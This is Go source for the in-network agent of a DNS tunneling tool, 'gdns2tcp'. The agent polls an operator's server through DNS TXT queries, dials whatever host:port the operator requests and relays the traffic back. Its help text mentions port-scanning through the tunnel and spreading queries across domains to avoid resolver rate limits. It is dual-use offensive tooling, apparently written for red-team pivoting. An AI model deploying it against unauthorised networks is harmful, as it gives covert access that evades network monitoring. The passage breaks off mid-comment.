// Command gdns2tcp-client-proxy is the agent that runs inside a target
// network. It long-polls the gdns2tcp server's apoll endpoint for new tunnel
// requests, dials the requested host:port locally, and bridges bytes back to
// the operator through aread/awrite. The operator never talks DNS — they hit
// the server's SOCKS5/TCP listener on port 9050 directly.
package main

import (
	"context"
	"crypto/cipher"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/rand/v2"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"gdns2tcp/internal/clihelp"
	"gdns2tcp/internal/codec"
	"gdns2tcp/internal/dnshelpers"
	"gdns2tcp/internal/protocol"
	gproxy "gdns2tcp/internal/proxy"
)

const defaultDNSPort = "53"

const (
	agentProtocolUnknown int32 = iota
	agentProtocolLegacy
	agentProtocolV2
)

type config struct {
	// domain is the canonical DNS domain — the one baked into HMAC
	// signatures. For single-domain configs it also equals the QNAME
	// suffix. For sharded configs it's the first entry of shardDomains.
	domain string
	// shardDomains is the full accepted set (canonical first). QNAMEs
	// rotate through this list round-robin so per-domain resolver
	// rate-limits accumulate rather than serialize on one zone.
	shardDomains []string
	// shardAuthDomains is protocol.AuthDomain(shardDomains[i]) precomputed
	// once at parseFlags time — the shape JoinNameFast wants as suffix.
	shardAuthDomains []string
	// shardLongest is the longest domain in shardDomains — used for the
	// worst-case budget in maxAxchgWritePlaintextBytes so no shard can
	// overflow the 253-char QNAME limit.
	shardLongest string
	// shardRotor drives round-robin selection from apoll/aclose (which
	// don't have a natural per-worker index). axchg workers hold their
	// own local counter for cheaper contention-free rotation.
	shardRotor *atomic.Uint64
	domainErr  error
	// protocolMode is shared by config copies. A v2-capable agent only
	// downgrades after the old server explicitly rejects the v2 marker;
	// timeouts and other transport errors leave negotiation unchanged.
	protocolMode *atomic.Int32

	pass          string
	dnsServer     string
	dnsPort       string
	tcp           bool
	pollMin       time.Duration
	pollMax       time.Duration
	maxConn       int
	retries       int
	retriesSet    bool
	targetTimeout time.Duration

	// Populated by the startup probe. A direct authoritative server can
	// sustain the full worker fan-out; a recursive resolver needs a
	// conservative profile to avoid rate limits and transient SERVFAILs.
	dnsPathKnown     bool
	dnsAuthoritative bool
}

// longestBudgetDomain returns the domain the QNAME-length budget must
// assume worst-case — parseFlags precomputes shardLongest, but test
// fixtures build config{} directly, so fall back to cfg.domain there.
func (c config) longestBudgetDomain() string {
	if c.shardLongest != "" {
		return c.shardLongest
	}
	return c.domain
}

// pickShardAuthDomain returns the next shard suffix for a non-worker
// caller (apoll/aclose) by round-robining shardRotor. Single-domain
// configs skip the atomic and just return the sole entry. Configs
// constructed without parseFlags (test fixtures) fall back to computing
// AuthDomain from cfg.domain directly.
func (c config) pickShardAuthDomain() string {
	if len(c.shardAuthDomains) == 0 {
		return protocol.AuthDomain(c.domain)
	}
	if len(c.shardAuthDomains) == 1 || c.shardRotor == nil {
		return c.shardAuthDomains[0]
	}
	idx := (c.shardRotor.Add(1) - 1) % uint64(len(c.shardAuthDomains))
	return c.shardAuthDomains[idx]
}

func (c config) retryShardAuthDomains() []string {
	domains := c.shardAuthDomains
	if len(domains) == 0 {
		return []string{protocol.AuthDomain(c.domain)}
	}
	if len(domains) == 1 || c.shardRotor == nil {
		return domains[:1]
	}
	start := int((c.shardRotor.Add(1) - 1) % uint64(len(domains)))
	ordered := make([]string, len(domains))
	for i := range ordered {
		ordered[i] = domains[(start+i)%len(domains)]
	}
	return ordered
}

func (c config) retryShardAuthDomain(first string, attempt int) string {
	domains := c.shardAuthDomains
	if len(domains) == 0 {
		return protocol.AuthDomain(c.domain)
	}
	if len(domains) == 1 {
		return domains[0]
	}
	start := 0
	for i, domain := range domains {
		if domain == first {
			start = i
			break
		}
	}
	return domains[(start+attempt)%len(domains)]
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	return runWithContext(ctx)
}

func runWithContext(ctx context.Context) error {
	cfg := parseFlags()
	return runAgentWithContext(ctx, cfg)
}

func runAgentWithContext(ctx context.Context, cfg config) error {
	if cfg.domainErr != nil {
		return cfg.domainErr
	}
	if cfg.domain == "" {
		return errors.New("domain is required")
	}
	if cfg.pass == "" {
		return errors.New("password is required")
	}
	selection, err := selectDNSPath(ctx, cfg, discoverAuthoritativeDNS, systemResolverAddress)
	if err != nil {
		return err
	}
	cfg.dnsServer = selection.server
	if selection.tcpRequired && !cfg.tcp {
		cfg.tcp = true
		fmt.Printf("authoritative DNS %s:%s requires TCP; promoting tunnel DNS transport to TCP\n", cfg.dnsServer, cfg.dnsPort)
	}
	if selection.source == dnsSelectionDelegation {
		fmt.Printf("discovered authoritative DNS %s:%s via delegation %s -> %s\n", cfg.dnsServer, cfg.dnsPort, selection.parent, selection.nameServer)
	}
	resolver := newTxtResolver(cfg)
	defer func() { resolver.close() }()

	authoritative, probeErr := probeConfiguredDomains(cfg, resolver)
	if !cfg.tcp && errors.Is(probeErr, errDNSResponseTruncated) {
		resolver.close()
		cfg.tcp = true
		resolver = newTxtResolver(cfg)
		fmt.Printf("DNS probe for %s was truncated over UDP; promoting tunnel DNS transport to TCP\n", cfg.domain)
		authoritative, probeErr = probeConfiguredDomains(cfg, resolver)
	}
	cfg.dnsPathKnown = true
	// A recursive fallback always keeps conservative tuning. Some forwarding
	// caches incorrectly relay AA from an upstream response, which must not
	// make a system resolver look like a direct authoritative connection.
	cfg.dnsAuthoritative = dnsPathIsAuthoritative(selection.source, authoritative, probeErr)
	if cfg.dnsAuthoritative {
		fmt.Printf("using direct authoritative DNS server %s:%s for %s\n", cfg.dnsServer, cfg.dnsPort, cfg.domain)
	} else {
		// Three quick SERVFAIL replies from a busy recursive resolver used to
		// tear down an otherwise healthy TCP tunnel in under a second. Keep a
		// user-supplied retry count intact, but use a safer automatic default.
		if !cfg.retriesSet && cfg.retries < 5 {
			cfg.retries = 5
			resolver.retries = cfg.retries
		}
		if selection.source == dnsSelectionSystem && selection.discoveryErr != nil {
			fmt.Fprintf(os.Stderr, "warning: authoritative DNS discovery failed: %v; using recursive DNS %s:%s with conservative resolver mode (%d retries). For reliable high-volume tunnels, pass -ds with the gdns2tcp server IP.\n", selection.discoveryErr, cfg.dnsServer, cfg.dnsPort, cfg.retries)
		} else {
			fmt.Fprintf(os.Stderr, "warning: DNS server %s:%s is not authoritative for %s; using conservative resolver mode (%d retries). For reliable high-volume tunnels, pass -ds with the gdns2tcp server IP.\n", cfg.dnsServer, cfg.dnsPort, cfg.domain, cfg.retries)
		}
		if probeErr != nil {
			fmt.Fprintf(os.Stderr, "warning: authoritative DNS probe failed: %v\n", probeErr)
		}
	}
	fmt.Printf("polling %s for tunnel requests (max %d concurrent)\n", cfg.domain, cfg.maxConn)

	var live atomic.Int64
	var tunnelWG sync.WaitGroup
	delay := cfg.pollMin
	for {
		select {
		case <-ctx.Done():
			resolver.close()
			tunnelWG.Wait()
			return nil
		default:
		}
		if int(live.Load()) >= cfg.maxConn {
			if !sleepContext(ctx, cfg.pollMax) {
				continue
			}
			continue
		}
		cid, target, pollID, v2, err := agentPollVersioned(cfg, resolver)
		if err != nil {
			fmt.Fprintf(os.Stderr, "apoll: %v\n", err)
			if !sleepContext(ctx, cfg.pollMax) {
				continue
			}
			continue
		}
		if cid == "" {
			if !sleepContext(ctx, delay) {
				continue
			}
			delay *= 2
			if delay > cfg.pollMax {
				delay = cfg.pollMax
			}
			continue
		}
		delay = cfg.pollMin
		live.Add(1)
		tunnelWG.Add(1)
		go func(cid, target, pollID string, v2 bool) {
			defer tunnelWG.Done()
			defer live.Add(-1)
			handleTunnelContext(ctx, cfg, resolver, cid, target, pollID, v2)
		}(cid, target, pollID, v2)
	}
}

func sleepContext(ctx context.Context, duration time.Duration) bool {
	timer := time.NewTimer(duration)
	defer timer.Stop()
	select {
	case <-ctx.Done():
		return false
	case <-timer.C:
		return true
	}
}

func parseFlags() config {
	cfg := config{protocolMode: &atomic.Int32{}}
	installUsage()
	flag.StringVar(&cfg.domain, "domain", "", "authoritative gdns2tcp domain. Accepts a single name or CSV list (a.com,b.com,c.com) — the first is used as the canonical HMAC domain, all are rotated round-robin as QNAME suffixes to spread load across resolver per-zone rate-limits.")
	flag.StringVar(&cfg.domain, "d", "", "short alias for -domain")
	flag.StringVar(&cfg.pass, "password", "", "shared encryption secret (must match server's -password)")
	flag.StringVar(&cfg.pass, "p", "", "short alias for -password")
	flag.StringVar(&cfg.pass, "pass", "", "deprecated alias for -password")
	flag.StringVar(&cfg.dnsServer, "dns-server", "", "DNS server address; empty discovers the delegated authoritative server and falls back to the system resolver")
	flag.StringVar(&cfg.dnsServer, "ds", "", "short alias for -dns-server")
	flag.StringVar(&cfg.dnsPort, "dns-port", defaultDNSPort, "DNS server port; defaults to 53")
	flag.StringVar(&cfg.dnsPort, "dp", defaultDNSPort, "short alias for -dns-port")
	flag.BoolVar(&cfg.tcp, "tcp", false, "use TCP instead of UDP for DNS queries")
	flag.DurationVar(&cfg.pollMin, "poll-min", 20*time.Millisecond, "minimum apoll/aread interval when active")
	flag.DurationVar(&cfg.pollMax, "poll-max", 200*time.Millisecond, "maximum apoll/aread interval after consecutive idle responses")
	flag.IntVar(&cfg.maxConn, "max-conn", 32, "maximum concurrent local tunnels (1-512)")
	flag.IntVar(&cfg.retries, "retries", 3, "DNS query attempts before failing")
	flag.DurationVar(&cfg.targetTimeout, "target-dial-timeout", 1*time.Second, "TCP dial timeout when the agent connects to the host the operator's SOCKS5 CONNECT asks for. Lower values speed up port-scan workloads through the tunnel (filtered ports release their cid sooner); raise if you legitimately tunnel to slow upstreams")
	flag.Parse()
	flag.Visit(func(f *flag.Flag) {
		if f.Name == "retries" {
			cfg.retriesSet = true
		}
	})

	cfg.domain, cfg.shardDomains, cfg.shardAuthDomains, cfg.shardLongest, cfg.domainErr = protocol.ParseDomainCSV(cfg.domain)
	cfg.shardRotor = new(atomic.Uint64)
	cfg.dnsPort = strings.TrimSpace(cfg.dnsPort)
	if cfg.dnsPort == "" {
		cfg.dnsPort = defaultDNSPort
	}
	if cfg.maxConn < 1 {
		cfg.maxConn = 1
	}
	if cfg.maxConn > 512 {
		cfg.maxConn = 512
	}
	if cfg.retries < 1 {
		cfg.retries = 1
	}
	if cfg.pollMin <= 0 {
		cfg.pollMin = 20 * time.Millisecond
	}
	if cfg.pollMax <= 0 {
		cfg.pollMax = 200 * time.Millisecond
	}
	if cfg.pollMax < cfg.pollMin {
		cfg.pollMax = cfg.pollMin
	}
	if cfg.targetTimeout <= 0 {
		cfg.targetTimeout = 1 * time.Second
	}
	return cfg
}

func installUsage() {
	program := filepath.Base(os.Args[0])
	flag.CommandLine.Usage = func() {
		clihelp.Print(flag.CommandLine.Output(), program,
			"-domain <zone> -password <secret> [options]",
			[]string{
				fmt.Sprintf("%s -domain files.example.com -password \"$GDNS_PASS\"", program),
				fmt.Sprintf("%s -domain files.example.com -password \"$GDNS_PASS\" -dns-server 203.0.113.10 -tcp", program),
				fmt.Sprintf("%s -domain files.example.com -password \"$GDNS_PASS\" -max-conn 64 -target-dial-timeout 750ms", program),
			},
			[]clihelp.Group{
				{
					Title: "Required",
					Flags: []clihelp.Flag{
						{Names: "-domain, -d <zone>", Description: "authoritative gdns2tcp zone; CSV enables shard fan-out, first zone is canonical"},
						{Names: "-password, -p <secret>", Description: "shared secret; must match the server"},
					},
				},
				{
					Title: "DNS transport",
					Flags: []clihelp.Flag{
						{Names: "-dns-server, -ds <ip>", Description: "explicit DNS server; empty auto-discovers the delegated authoritative server"},
						{Names: "-dns-port, -dp <port>", Description: "DNS server port (default " + defaultDNSPort + ")"},
						{Names: "-tcp", Description: "use TCP instead of UDP for DNS queries"},
						{Names: "-retries <n>", Description: "DNS query attempts before failing (default 3)"},
					},
				},
				{
					Title: "Tunnel capacity and target dialing",
					Flags: []clihelp.Flag{
						{Names: "-max-conn <n>", Description: "maximum concurrent local target connections, 1-512 (default 32)"},
						{Names: "-target-dial-timeout <duration>", Description: "TCP dial timeout for target host:port requested through SOCKS (default 1s)"},
					},
				},
				{
					Title: "Polling cadence",
					Flags: []clihelp.Flag{
						{Names: "-poll-min <duration>", Description: "minimum apoll/aread interval while active (default 20ms)"},
						{Names: "-poll-max <duration>", Description: "maximum apoll/aread interval after idle responses (default 200ms)"},
					},
				},
				{
					Title: "Deprecated aliases",
					Flags: []clihelp.Flag{
						{Names: "-pass <secret>", Description: "alias for -password"},
					},
				},
			},
			[]string{
				"Run this on the target side; the operator connects to the server's SOCKS listener.",
				"Without -ds, system DNS bootstraps delegation discovery; tunnel traffic goes direct unless recursive fallback is required.",
				"Recursive fallback uses unique nonce-bearing QNAMEs so intermediate DNS caches cannot replay stale tunnel state.",
				"Go's flag parser accepts both -flag and --flag forms.",
			},
		)
	}
}

func probeConfiguredDomains(cfg config, resolver *txtResolver) (bool, error) {
	domains := cfg.shardDomains
	if len(domains) == 0 {
		domains = []string{cfg.domain}
	}
	for _, domain := range domains {
		probeName, err := newAuthoritativeProbeName(domain)
		if err != nil {
			return false, err
		}
		authoritative, err := resolver.probeAuthoritative(probeName)
		if err != nil {
			return false, fmt.Errorf("%s: %w", domain, err)
		}
		if !authoritative {
			return false, nil
		}
	}
	return true, nil
}

func dnsPathIsAuthoritative(source dnsSelectionSource, probeAuthoritative bool, probeErr error) bool {
	return source != dnsSelectionSystem && probeErr == nil && probeAuthoritative
}

// --- Tunnel handling -------------------------------------------------------

// tunnelSession is the per-cid state shared by the two pumps: AEAD, session
// MAC key, and an atomic nonce counter used by aread/aclose for replay
// protection on the server. Each request bumps nonce.Add(1).
type tunnelSession struct {
	aead       cipher.AEAD
	sessionKey [32]byte
	compressor *gproxy.Compressor
	nonce      atomic.Uint64
	readAck    atomic.Uint64
}

func (ts *tunnelSession) nextNonce() uint64 {
	return ts.nonce.Add(1)
}

// handleTunnel dials the target locally and bridges bytes through the DNS
// tunnel until either side closes.
func handleTunnel(cfg config, resolver *txtResolver, cid, target, pollID string, v2 bool) {
	handleTunnelContext(context.Background(), cfg, resolver, cid, target, pollID, v2)
}

func handleTunnelContext(parent context.Context, cfg config, resolver *txtResolver, cid, target, pollID string, v2 bool) {
	dialer := net.Dialer{Timeout: cfg.targetTimeout, KeepAlive: 30 * time.Second}
	upstream, err := dialer.DialContext(parent, "tcp", target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "dial %s for cid=%s: %v\n", target, cid, err)
		_ = confirmAgentOpen(cfg, resolver, cid, pollID, dialFailureStatus(err), v2)
		return
	}
	defer upstream.Close()
	// Шаг G: kill Nagle on the upstream so interactive byte echoes don't get
	// coalesced. KeepAlive is already armed via the Dialer above.
	if tc, ok := upstream.(*net.TCPConn); ok {
		_ = tc.SetNoDelay(true)
	}

	aead, err := gproxy.SessionAEAD(cfg.pass, cid)
	if err != nil {
		_ = confirmAgentOpen(cfg, resolver, cid, pollID, "unreachable", v2)
		return
	}
	compressor, err := gproxy.GetCompressor()
	if err != nil {
		_ = confirmAgentOpen(cfg, resolver, cid, pollID, "unreachable", v2)
		return
	}
	ts := &tunnelSession{
		aead:       aead,
		sessionKey: protocol.DeriveSessionKey(cfg.pass, cid),
		compressor: compressor,
	}
	if err := confirmAgentOpen(cfg, resolver, cid, pollID, "ok", v2); err != nil {
		fmt.Fprintf(os.Stderr, "aopen cid=%s: %v\n", cid, err)
		return
	}
	// Worst-case budget assumes seq+nonce fit in 32 bits (= 8 hex chars
	// each). With 96 axchg workers and one seq per chunk, at 100K q/s
	// the cap is exceeded only after ~12 hours of continuous bulk —
	// well beyond reverseTTL. Server still parses any uint64 via base
	// 16, so a wraparound only causes the agent's query to overflow
	// the 253-char limit (FORMERR + tunnel close), not corruption.
	//
	// For sharded configs we budget against the *longest* configured
	// shard — a shorter shard would just leave headroom, but a longer
	// one would silently overflow QNAME once the RR cursor lands there.
	worstBuf := maxAxchgWritePlaintextBytes(cfg.longestBudgetDomain(), cfg.tcp, 8, 8) - 1
	if worstBuf < 16 {
		fmt.Fprintf(os.Stderr, "domain %q too long: axchg plaintext budget is %d bytes, need at least 16\n", cfg.domain, worstBuf)
		_ = agentClose(cfg, resolver, ts, cid)
		return
	}

	ctx, cancel := context.WithCancel(parent)
	defer cancel()
	done := ctx.Done()
	stop := cancel

	runBidirectionalTunnel(cfg, tuningForCfg(cfg), resolver, ts, cid, upstream, done, stop)

	_ = upstream.Close()
	_ = agentClose(cfg, resolver, ts, cid)
}

func dialFailureStatus(err error) string {
	if isTimeout(err) {
		return "timeout"
	}
	var opErr *net.OpError
	if errors.As(err, &opErr) && opErr.Timeout() {
		return "timeout"
	}
	return "refused"
}

// cfg.retries controls how many times a worker retries one axchg round-trip
// before tearing down the tunnel. 1–5% UDP loss is normal on residential and
// cellular WAN; without retries, a bulk download trips `connection closed`
// mid-stream on the first dropped packet. Each retry resends the exact same
// nonce and QNAME, so the server's response cache can return the retained
// outbound chunk byte-for-byte. Write-bearing retries are also safe because
// the server fast-paths duplicate sequences without applying them twice.

// errServerSeq is the typed sentinel for the server's "ERR seq" response
// (agent's awrite seq is too far ahead of the server's drain). Workers
// match on this with errors.Is to apply backpressure without relying on
// fragile string equality.
var errServerSeq = errors.New("ERR seq")

// tunnelTuning groups every per-tunnel knob whose ideal value differs
// between UDP and TCP DNS transports. Splitting them lets each transport
// be tuned independently: bumping UDP worker count doesn't push TCP into
// pool-contention regression, and vice versa.
type tunnelTuning struct {
	// workers is the per-tunnel axchg worker goroutine count. Each
	// worker independently picks a write job from the queue (or issues
	// a pure-read pull) and runs one DNS round-trip.
	workers int
	// reorderCap bounds the per-cid reorder buffer for op→upstream
	// chunks. Sized as workers × 4 so a burst of out-of-order arrivals
	// can settle without overflow.
	reorderCap int
	// backpressureCap is the wall-clock budget a single worker spends
	// absorbing "ERR seq" retries before letting the error propagate.
	// Tuned generously — well short of reverseTTL (30 min) so a stuck
	// tunnel is torn down before the server's GC reclaims it, but long
	// enough to ride out goroutine-scheduling skew on the slowest seq.
	backpressureCap time.Duration
}

// udpTuning and tcpTuning are the two presets. UDP wins from more
// workers (per-RT CPU dominates on loopback / LAN, parallelism scales
// almost linearly). TCP saturates earlier because the DNS-over-TCP pool
// holds only `tcpPoolConns` sockets and adding workers past that just
// piles HoL contention onto the same conns.
var (
	udpTuning = tunnelTuning{
		workers:         96,
		reorderCap:      96 * 4,
		backpressureCap: 5 * time.Minute,
	}
	tcpTuning = tunnelTuning{
		workers:         32,
		reorderCap:      32 * 4,
		backpressureCap: 5 * time.Minute,
	}
	// Recursive resolvers frequently rate-limit the 32/96-worker direct
	// profile. Keep enough parallelism for interactive and LDAP traffic while
	// staying below typical per-client burst limits.
	recursiveUDPTuning = tunnelTuning{
		workers:         12,
		reorderCap:      12 * 4,
		backpressureCap: 5 * time.Minute,
	}
	recursiveTCPTuning = tunnelTuning{
		workers:         8,
		reorderCap:      8 * 4,
		backpressureCap: 5 * time.Minute,
	}
)

func tuningForCfg(cfg config) tunnelTuning {
	if cfg.dnsPathKnown && !cfg.dnsAuthoritative {
		if cfg.tcp {
			return recursiveTCPTuning
		}
		return recursiveUDPTuning
	}
	if cfg.tcp {
		return tcpTuning
	}
	return udpTuning
}

// runBidirectionalTunnel replaces the prior pair of pumpOperatorToUpstream /
// pumpUpstreamToOperator goroutines with a single dispatcher backed by the
// axchg command. Every DNS query carries both directions: workers pick the
// next write job if there is one, otherwise issue a pure-read axchg.
//
// Throughput effect: on interactive traffic (SSH, REPL) each keystroke and
// echo pair fits inside one DNS round-trip instead of two — perceived RTT
// halves. Bulk traffic gets the full pipeline of N concurrent axchgs.
func runBidirectionalTunnel(cfg config, tuning tunnelTuning, resolver *txtResolver, ts *tunnelSession, cid string, upstream net.Conn, done <-chan struct{}, stop func()) {
	writeJobs := make(chan awriteJob, tuning.workers)
	readResults := make(chan exchangeResult, tuning.workers)
	orderedReads := make(chan exchangeResult, tuning.reorderCap)
	internalStop := make(chan struct{})
	var stopOnce sync.Once
	stopAll := func() {
		stopOnce.Do(func() { close(internalStop) })
		stop()
	}
	var lifecycleWG sync.WaitGroup
	writerDone := make(chan struct{})
	writerErr := make(chan error, 1)
	lifecycleWG.Add(1)
	go func() {
		defer lifecycleWG.Done()
		defer close(writerDone)
		for result := range orderedReads {
			if err := writeAll(upstream, result.readData); err != nil {
				writerErr <- err
				stopAll()
				return
			}
			// Read ACK means "written to the target", not merely received from
			// DNS. Advancing it here keeps server-side retransmission safe.
			ts.readAck.Store(result.readSeq)
		}
	}()
	writerClosed := false
	finishWriter := func() {
		if !writerClosed {
			writerClosed = true
			close(orderedReads)
		}
		<-writerDone
	}
	defer func() {
		stopAll()
		finishWriter()
		lifecycleWG.Wait()
	}()

	var workerWG sync.WaitGroup
	for i := 0; i < tuning.workers; i++ {
		workerWG.Add(1)
		go func(workerIdx int) {
			defer workerWG.Done()
			delay := cfg.pollMin
			// Each worker holds a local shard cursor seeded with its
			// own index, so N workers × M shards spread evenly across
			// zones without any cross-worker contention. Single-domain
			// configs collapse to a constant (shardAuthDomains[0]).
			// Test fixtures may construct config{} without
			// parseFlags — fall back to cfg.pickShardAuthDomain which
			// derives from cfg.domain in that case.
			shardIdx := workerIdx
			pickShard := func() string {
				if len(cfg.shardAuthDomains) == 0 {
					return cfg.pickShardAuthDomain()
				}
				d := cfg.shardAuthDomains[shardIdx%len(cfg.shardAuthDomains)]
				shardIdx++
				return d
			}
			for {
				var job awriteJob
				haveJob := false
				select {
				case <-done:
					return
				case <-internalStop:
					return
				case j, ok := <-writeJobs:
					if !ok {
						return
					}
					job = j
					haveJob = true
				default:
				}
				if !haveJob {
					// No write pending — wait briefly for either one to
					// appear or for a backoff tick. Pure-read axchgs poll
					// the server for op→agent data.
					timer := time.NewTimer(delay)
					select {
					case <-done:
						timer.Stop()
						return
					case <-internalStop:
						timer.Stop()
						return
					case j, ok := <-writeJobs:
						timer.Stop()
						if !ok {
							return
						}
						job = j
						haveJob = true
					case <-timer.C:
					}
				}
				var (
					res               exchangeResult
					err               error
					backpressureStart time.Time
				)
				for {
					shardAuth := pickShard()
					if haveJob {
						res, err = agentExchange(cfg, resolver, ts, cid, job.seq, job.data, shardAuth)
					} else {
						res, err = agentExchange(cfg, resolver, ts, cid, 0, nil, shardAuth)
					}
					if err == nil {
						break
					}
					if haveJob && errors.Is(err, errServerSeq) {
						if backpressureStart.IsZero() {
							backpressureStart = time.Now()
						}
						if time.Since(backpressureStart) <= tuning.backpressureCap {
							// First few hits use a short sleep so a transient
							// window-full (server's about to drain) recovers
							// in ~1 ms instead of ~15 ms. Persistent
							// backpressure escalates to the wider 5-24 ms
							// jitter that spaces 32 workers apart.
							var jitter time.Duration
							if elapsedMs := time.Since(backpressureStart).Milliseconds(); elapsedMs < 20 {
								jitter = time.Duration(1+rand.IntN(3)) * time.Millisecond
							} else {
								jitter = time.Duration(5+rand.IntN(20)) * time.Millisecond
							}
							// NewTimer+Stop instead of time.After so we don't
							// leak timer goroutines when canceled via done/
							// internalStop.
							timer := time.NewTimer(jitter)
							select {
							case <-done:
								timer.Stop()
								gproxy.PutBuf(job.bufPtr)
								return
							case <-internalStop:
								timer.Stop()
								gproxy.PutBuf(job.bufPtr)
								return
							case <-timer.C:
							}
							continue
						}
					}
					// agentExchange already retried the exact same QNAME for every
					// transport failure.  Creating a new nonce now would abandon a
					// possibly consumed server response, so fail closed instead.
					break
				}
				if haveJob {
					gproxy.PutBuf(job.bufPtr)
				}
				if err != nil {
					fmt.Fprintf(os.Stderr, "axchg cid=%s (%d attempts): %v\n", cid, cfg.retries, err)
					stopAll()
					return
				}
				select {
				case readResults <- res:
				case <-done:
					return
				case <-internalStop:
					return
				}
				if res.readClosed {
					return
				}
				if res.readEmpty && !haveJob {
					delay *= 2
					if delay > cfg.pollMax {
						delay = cfg.pollMax
					}
				} else {
					delay = cfg.pollMin
				}
			}
		}(i)
	}

	// Upstream reader: target → writeJobs channel. Blocking Read; a second
	// goroutine watches done/internalStop and pokes the socket with a
	// time-in-the-past deadline so the blocked Read returns immediately.
	// This eliminates the previous 100 ms polling loop which used to add up
	// to ~100 ms tail latency on the first byte from upstream.
	//
	// bufSize reserves one byte of plaintext budget for the compressor's
	// flag prefix; without it an incompressible chunk would overflow the
	// axchg name-length cap.
	lifecycleWG.Add(1)
	go func() {
		defer lifecycleWG.Done()
		select {
		case <-done:
		case <-internalStop:
		}
		_ = upstream.SetReadDeadline(time.Unix(1, 0))
		_ = upstream.SetWriteDeadline(time.Unix(1, 0))
	}()
	lifecycleWG.Add(1)
	go func() {
		defer lifecycleWG.Done()
		var seq uint64
		// Budget only changes when hexWidth(seq+1) rolls over the next
		// power-of-16 boundary (seq = 15, 255, 4095, 65535, …). Caching
		// the last (width, bufSize) pair skips the arithmetic + string-
		// length work on the other ~99.9% of iterations.
		var cachedSeqWidth int
		var cachedBufSize int
		for {
			// Refuse to issue more queries once the per-tunnel counters
			// approach 32 bits — the budget calc assumes 8-hex-char
			// seq/nonce and an overflow would silently start emitting
			// 9+ char labels, blowing the 253-char query name and
			// causing the server to FORMERR every round-trip until the
			// tunnel dies. Tear down cleanly instead.
			if nonceGuardExceeded(seq, ts.nonce.Load(), tuning.workers) {
				fmt.Fprintf(os.Stderr, "axchg cid=%s: seq/nonce approaching 32-bit cap, closing tunnel\n", cid)
				stopAll()
				return
			}
			seqWidth := hexWidth(seq + 1)
			if seqWidth != cachedSeqWidth {
				cachedSeqWidth = seqWidth
				cachedBufSize = maxAxchgWritePlaintextBytes(cfg.longestBudgetDomain(), cfg.tcp, seqWidth, 8) - 1
				if cachedBufSize < 16 {
					cachedBufSize = 16
				}
			}
			bufPtr := gproxy.GetBuf(cachedBufSize)
			n, err := upstream.Read(*bufPtr)
			if n > 0 {
				seq++
				job := awriteJob{
					seq:    seq,
					data:   (*bufPtr)[:n],
					bufPtr: bufPtr,
				}
				select {
				case writeJobs <- job:
				case <-done:
					gproxy.PutBuf(bufPtr)
					return
				case <-internalStop:
					gproxy.PutBuf(bufPtr)
					return
				}
			} else {
				// Read returned (0, err) — buf was untouched, return it
				// straight to the pool so it doesn't escape the GC.
				gproxy.PutBuf(bufPtr)
			}
			if err != nil {
				// Cancellation paths share the same deadline-poke trick;
				// distinguish by inspecting the stop channels.
				select {
				case <-done:
					return
				case <-internalStop:
					return
				default:
				}
				if errors.Is(err, io.EOF) {
					fmt.Fprintf(os.Stderr, "upstream EOF cid=%s\n", cid)
				} else {
					fmt.Fprintf(os.Stderr, "upstream read cid=%s: %v\n", cid, err)
				}
				// Upstream EOF (or error). Close writeJobs so workers
				// finish in-flight chunks instead of being killed mid-
				// round-trip (which drops the last ~2 KB of the stream).
				close(writeJobs)
				return
			}
		}
	}()

	lifecycleWG.Add(1)
	go func() {
		defer lifecycleWG.Done()
		workerWG.Wait()
		close(readResults)
	}()

	// Read reorder + writer: in-order delivery to upstream.
	nextSeq := uint64(1)
	pending := make(map[uint64][]byte, tuning.reorderCap)
	for r := range readResults {
		if r.readClosed {
			stopAll()
			drainExchange(readResults)
			return
		}
		if r.readEmpty || len(r.readData) == 0 {
			continue
		}
		if r.readSeq < nextSeq {
			continue
		}
		pending[r.readSeq] = r.readData
		if len(pending) > tuning.reorderCap {
			fmt.Fprintf(os.Stderr, "axchg cid=%s: reorder buffer overflow (lost seq %d?), closing\n", cid, nextSeq)
			stopAll()
			drainExchange(readResults)
			return
		}
		if !enqueueContiguous(pending, &nextSeq, orderedReads, done, internalStop) {
			stopAll()
			drainExchange(readResults)
			return
		}
	}
	// readResults closed → all workers exited (clean teardown path).
	// Queue any final contiguous reads, then warn if a gap left data stranded:
	// the operator will see EOF mid-stream rather than silent truncation.
	_ = enqueueContiguous(pending, &nextSeq, orderedReads, done, internalStop)
	deadline := cfg.targetTimeout
	if deadline <= 0 {
		deadline = 5 * time.Second
	}
	_ = upstream.SetWriteDeadline(time.Now().Add(deadline))
	finishWriter()
	stopAll()
	select {
	case err := <-writerErr:
		fmt.Fprintf(os.Stderr, "axchg cid=%s: target write: %v\n", cid, err)
	default:
	}
	if len(pending) > 0 {
		fmt.Fprintf(os.Stderr, "axchg cid=%s: stream truncated at seq %d, %d chunks lost\n", cid, nextSeq, len(pending))
	}
}

// enqueueContiguous moves in-order DNS results to the dedicated target writer.
// Keeping socket writes off the result-dispatch goroutine prevents a full-
// duplex cycle where a target blocks writing its response until it can read,
// while the agent has stopped reading because all axchg workers are waiting to
// publish more read results. ACK advancement remains in the writer goroutine.
func enqueueContiguous(pending map[uint64][]byte, nextSeq *uint64, out chan<- exchangeResult, done, internalStop <-chan struct{}) bool {
	for {
		data, ok := pending[*nextSeq]
		if !ok {
			return true
		}
		result := exchangeResult{readData: data, readSeq: *nextSeq}
		select {
		case out <- result:
			delete(pending, *nextSeq)
			*nextSeq++
		case <-done:
			return false
		case <-internalStop:
			return false
		}
	}
}

func drainExchange(ch <-chan exchangeResult) {
	for range ch {
	}
}

type awriteJob struct {
	seq    uint64
	data   []byte
	bufPtr *[]byte // pooled buffer backing `data`; PutBuf releases after use
}

// maxAxchgWritePlaintextBytes returns the largest raw byte count we can
// place in a single axchg DNS query name without exceeding 253 printable
// chars. The layout is:
//
//	cid(16) . writeSeq(seqWidth) . [dataLabels...] . ["x-tcp"(5)] . readNonce(nonceWidth) . smac(8) . "axchg"(5) . domain
//
// seqWidth / nonceWidth let the caller pass the *actual* decimal-digit
// widths of the seq and nonce to be sent. Passing the worst-case width
// (20 for uint64 in decimal) is the conservative startup check; passing
// the predicted next-iteration widths lets the reader reclaim ~10-30
